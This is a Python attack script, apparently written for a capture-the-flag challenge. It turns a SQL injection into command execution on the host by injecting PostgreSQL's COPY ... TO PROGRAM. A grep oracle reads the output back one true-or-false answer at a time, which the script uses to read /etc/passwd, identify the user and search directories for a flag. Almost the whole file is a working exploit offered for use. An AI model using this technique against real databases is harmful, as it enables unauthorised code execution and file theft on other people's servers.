#!/usr/bin/env python
"""Shell channel over COPY ... TO PROGRAM, with an output-readback trick.

    MARS'; COPY (SELECT 1) TO PROGRAM '<cmd>'; SELECT 1; --

<cmd> is run by /bin/sh -c as the operating-system user that owns PostgreSQL; a non-zero exit
becomes a raised error, which the app renders as its ordinary null, so the bit is
"did the command succeed".  `grep -qE -f -` turned out not to work here (stdin patterns), but
double quotes are *not* SQL quotes, so they survive inside the injected literal and a pattern
can simply be a quoted argument -- the only real constraint is that the app lower-cases
everything, so patterns must be written in lower case (use [^...] and . to cover the rest).

Output readback: run "<cmd> > /tmp/o; grep -qE "<pat>" /tmp/o".  That turns the one bit into a
question about arbitrary command output, which is all a flag search needs.
"""
import sys
import threading

import extract as E

OUT = "/tmp/.pp_out"


def run(cmd):
    return E.ask("MARS'; COPY (SELECT 1) TO PROGRAM '%s'; SELECT 1; -- " % cmd)


def out(pat, cmd):
    """Does <cmd>'s output contain an ERE match for <pat>?"""
    return run("%s > %s 2>&1; grep -qE %s %s" % (cmd, OUT, _q(pat), OUT))


def _q(s):
    return '"%s"' % s


def line(pat, path):
    return run("grep -qE %s %s" % (_q(pat), path))


def exists(p):
    return run("test -f " + p)


def readable(p):
    return run("test -r " + p)


def nonempty(p):
    return run("test -s " + p)


def ls_matches(pattern, d="/"):
    return out(pattern, "ls -a " + d)


if __name__ == "__main__":
    print("[*] channel control (must be True):", out("root", "cat /etc/passwd"), flush=True)
    print("[*] nonsense control (must be False):", out("zzqx9", "cat /etc/passwd"), flush=True)
    print("[*] whoami:", flush=True)
    for pat in ["^[a-z]", "^root", "^postgres", "^daemon"]:
        print("   whoami ~ %-12s %s" % (pat, out(pat, "id -un")), flush=True)
    print("[*] where is the flag?")
    for d in ["/", "/app", "/opt", "/srv", "/ctf", "/home", "/var/www", "/usr/local", "/etc"]:
        for pat in ["flag", "sun", "^s", "^c", "^f"]:
            if ls_matches(pat, d):
                print("   %-12s has something matching %r" % (d, pat), flush=True)
    print("[*] grep -r for sun{ in likely dirs (bounded):")
    for d in ["/app", "/opt", "/srv", "/etc", "/home", "/ctf"]:
        print("   %-8s %s" % (d, out("sun\\\\{", "grep -rl sun" + chr(92) + "{ " + d + " 2>/dev/null")), flush=True)
